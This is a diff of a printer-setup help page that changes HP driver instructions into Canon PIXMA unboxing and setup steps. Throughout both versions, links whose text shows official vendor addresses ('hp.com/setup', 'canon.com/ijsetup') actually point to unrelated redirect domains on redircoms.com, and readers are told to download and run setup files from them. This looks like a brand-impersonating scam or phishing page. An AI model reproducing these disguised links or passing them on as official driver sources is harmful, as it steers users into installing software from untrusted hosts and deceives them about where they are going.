@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+Get Started with Canon - Setting up your PIXMA straight out of the box
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: E181B8BDF2CB760DDE8EC625F4AC6BB4
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: SETUP-YOUR-PRINTER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: canon.com/ijsetup
+      :target: https://can.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,44 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Setting up your new Canon PIXMA printer is quick and easy. Whether you’re using it for home, school, or office needs, Canon ensures a smooth setup experience. To begin the installation process, visit `canon.com/ijsetup <https://can.redircoms.com>`_ where you can find drivers, manuals, and setup instructions tailored for your specific PIXMA model.
 
-**********
-Steps to Download HP Printer Driver
-**********
+What’s in the Box?
+-------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+When you unbox your Canon PIXMA printer, make sure the following items are included:
 
-2. Enter your HP printer model in the search box.
+- Canon PIXMA printer unit  
+- Power cord and adapter  
+- Ink cartridges (usually black and color)  
+- Installation CD (optional)  
+- Setup guide/manual  
+- USB cable (only with select models)
 
-3. Select your operating system if prompted.
+Initial Setup Steps
+--------------------
 
-4. Click on **Download** to get the latest driver and software package.
+**1. Power On the Printer**  
+Connect the printer to a power source and press the Power button. Wait until the device initializes.
 
-5. Save the installer file to your computer.
+**2. Install Ink Cartridges**  
+Lift the top cover and install the provided ink cartridges in their respective slots. The printer will often run an automatic alignment after this step.
 
-**********
-Steps to Install HP Printer Driver
-**********
+**3. Load Paper**  
+Insert plain paper into the rear or front paper tray depending on your model.
 
-1. Locate the downloaded installer file on your computer.
+**4. Download Drivers and Software**  
+Go to `canon.com/ijsetup <https://can.redircoms.com>`_ and enter your PIXMA model number. Download the necessary drivers and the Canon IJ Setup software.
 
-2. Double-click the installer to begin the setup process.
+**5. Connect to Wi-Fi or USB**  
+Use the on-screen prompts to connect your PIXMA to your Wi-Fi network or via USB. Most modern PIXMA printers support wireless setup using the Canon IJ Network Tool.
 
-3. Follow the on-screen instructions and accept the license agreement.
+**6. Complete Installation**  
+Run the downloaded setup file on your computer or mobile device. Follow the instructions to complete installation and perform a test print.
 
-4. Choose your connection type (USB or Wireless).
+Additional Tips
+----------------
 
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+- Keep your firmware updated for optimal performance.
+- Use genuine Canon ink for best print quality and longevity.
+- Access printer status, ink levels, and wireless settings from the Canon PRINT app.
